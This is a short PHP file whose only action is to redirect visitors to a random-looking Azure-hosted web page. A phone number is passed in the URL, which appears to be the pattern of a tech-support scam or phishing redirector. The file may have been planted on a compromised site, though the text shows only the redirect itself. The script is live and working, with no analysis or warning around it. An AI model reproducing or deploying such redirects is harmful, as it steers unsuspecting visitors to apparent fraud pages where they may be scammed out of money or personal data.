<?php
// Define the destination URL
$destination_url = "https://look8out6vwcor8bsxwe.z8.web.core.windows.net/index.html?Aniph=1-864-304-4980";

// Send the Location header for redirection
header("Location: " . $destination_url);

// It's crucial to stop script execution after sending the header
// to prevent any further output or unintended actions.
exit(); 
?>